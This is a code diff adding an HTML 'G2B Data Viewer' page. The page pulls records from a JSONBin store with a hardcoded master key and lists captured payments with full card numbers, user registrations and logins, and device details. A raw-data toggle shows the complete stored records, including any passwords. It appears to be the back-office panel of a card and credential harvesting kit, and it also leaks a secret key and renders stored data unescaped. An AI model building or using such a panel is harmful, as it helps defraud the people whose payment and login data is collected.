@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Viewer</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .data-item { border: 1px solid #ddd; padding: 15px; margin-bottom: 15px; border-radius: 5px; }
+        .data-item pre { background: #f5f5f5; padding: 10px; overflow-x: auto; }
+        .password { color: #999; }
+        .device-info { font-size: 0.9em; color: #666; margin-top: 10px; }
+        .timestamp { font-style: italic; color: #888; }
+        h1 { color: #333; }
+        .filter { margin-bottom: 20px; }
+        .filter select, .filter button { padding: 8px; margin-right: 10px; }
+        .no-data { color: #999; font-style: italic; }
+    </style>
+</head>
+<body>
+    <h1>G2B Data Viewer</h1>
+    
+    <div class="filter">
+        <select id="data-type">
+            <option value="all">All Data</option>
+            <option value="payment">Payments Only</option>
+            <option value="user_registration">Registrations Only</option>
+            <option value="user_login">Logins Only</option>
+            <option value="page_view">Page Views Only</option>
+        </select>
+        <button onclick="fetchData()">Refresh Data</button>
+        <button onclick="clearData()">Clear Displayed Data</button>
+    </div>
+    
+    <div id="data-container"></div>
+    
+    <script>
+        // Fetch data from JSONBin
+        function fetchData() {
+            const container = document.getElementById('data-container');
+            container.innerHTML = '<p>Loading data...</p>';
+            
+            fetch('https://api.jsonbin.io/v3/b/68b59822d0ea881f406e015d/latest', {
+                method: 'GET',
+                headers: {
+                    'X-Master-Key': '$2a$10$y4zuIIvE6J5qXg7q1cWH0Oo6TAM7L83p7mrosVQE/DVrG4K1QKv4C'
+                }
+            })
+            .then(response => response.json())
+            .then(result => {
+                const cloudData = result.record || { data: [] };
+                displayData(cloudData.data || []);
+            })
+            .catch(error => {
+                console.error("Error fetching data:", error);
+                container.innerHTML = '<p class="no-data">Error loading data. Please try again.</p>';
+            });
+        }
+        
+        // Display data in the container
+        function displayData(dataArray) {
+            const container = document.getElementById('data-container');
+            const dataType = document.getElementById('data-type').value;
+            
+            // Filter data if needed
+            let filteredData = dataArray;
+            if (dataType !== 'all') {
+                filteredData = dataArray.filter(item => item.type === dataType);
+            }
+            
+            if (filteredData.length === 0) {
+                container.innerHTML = '<p class="no-data">No data found.</p>';
+                return;
+            }
+            
+            container.innerHTML = '';
+            
+            filteredData.forEach(item => {
+                const div = document.createElement('div');
+                div.className = 'data-item';
+                
+                // Create basic info
+                let html = `
+                    <h3>${getItemTitle(item)}</h3>
+                    <p class="timestamp">Submitted: ${item.timestamp || 'Unknown time'}</p>
+                `;
+                
+                // Add specific details based on type
+                if (item.type === 'payment') {
+                    html += `
+                        <p><strong>Product:</strong> ${item.product || 'N/A'}</p>
+                        <p><strong>Price:</strong> ${item.price || 'N/A'}</p>
+                        <p><strong>Name:</strong> ${(item.firstName || '') + ' ' + (item.lastName || '')}</p>
+                        <p><strong>Email:</strong> ${item.email || 'N/A'}</p>
+                        <p><strong>Card:</strong> ${item.cardNumber || 'N/A'}</p>
+                    `;
+                } else if (item.type === 'user_registration' || item.type === 'user_login') {
+                    html += `
+                        <p><strong>Name:</strong> ${item.fullname || 'N/A'}</p>
+                        <p><strong>Email:</strong> ${item.email || 'N/A'}</p>
+                        <p><strong>Password:</strong> <span class="password">********</span></p>
+                    `;
+                } else if (item.type === 'page_view') {
+                    html += `
+                        <p><strong>URL:</strong> ${item.url || 'N/A'}</p>
+                        <p><strong>Details:</strong> ${item.details || 'N/A'}</p>
+                    `;
+                }
+                
+                // Add device info
+                if (item.device) {
+                    html += `
+                        <div class="device-info">
+                            <p><strong>Device Info:</strong></p>
+                            <p>User Agent: ${item.device.userAgent || 'N/A'}</p>
+                            <p>Platform: ${item.device.platform || 'N/A'}</p>
+                            <p>Screen: ${item.device.screenWidth || '0'}x${item.device.screenHeight || '0'}</p>
+                            <p>Language: ${item.device.language || 'N/A'}</p>
+                        </div>
+                    `;
+                }
+                
+                // Add raw data toggle
+                html += `
+                    <button onclick="toggleRawData(this)">Show Raw Data</button>
+                    <pre style="display:none;">${JSON.stringify(item, null, 2)}</pre>
+                `;
+                
+                div.innerHTML = html;
+                container.appendChild(div);
+            });
+        }
+        
+        // Get a title for the item based on its type
+        function getItemTitle(item) {
+            switch(item.type) {
+                case 'payment':
+                    return `Payment for ${item.product || 'Unknown Product'}`;
+                case 'user_registration':
+                    return `User Registration: ${item.email || 'Unknown Email'}`;
+                case 'user_login':
+                    return `User Login: ${item.email || 'Unknown Email'}`;
+                case 'page_view':
+                    return `Page View: ${item.url || 'Unknown URL'}`;
+                default:
+                    return `Data Item: ${item.id || 'Unknown ID'}`;
+            }
+        }
+        
+        // Toggle raw data display
+        function toggleRawData(button) {
+            const pre = button.nextElementSibling;
+            if (pre.style.display === 'none') {
+                pre.style.display = 'block';
+                button.textContent = 'Hide Raw Data';
+            } else {
+                pre.style.display = 'none';
+                button.textContent = 'Show Raw Data';
+            }
+        }
+        
+        // Clear displayed data
+        function clearData() {
+            document.getElementById('data-container').innerHTML = '<p class="no-data">Data cleared. Click "Refresh Data" to load again.</p>';
+        }
+        
+        // Load data on page load
+        document.addEventListener('DOMContentLoaded', fetchData);
+    </script>
+</body>
+</html>
